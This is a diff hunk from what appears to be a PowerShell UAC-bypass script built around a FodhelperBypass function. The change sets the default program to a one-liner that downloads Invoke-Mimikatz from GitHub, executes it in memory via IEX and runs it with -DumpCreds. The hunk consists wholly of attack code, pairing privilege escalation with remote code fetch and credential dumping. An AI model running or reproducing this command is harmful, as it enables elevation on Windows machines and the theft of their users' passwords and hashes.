@@ -32,7 +32,7 @@
 function FodhelperBypass(){ 
  Param (
            
-        [String]$program = "" #default
+        [String]$program = "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/g4uss47/Invoke-Mimikatz/master/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds" #default
        )
 
     #Create registry structure
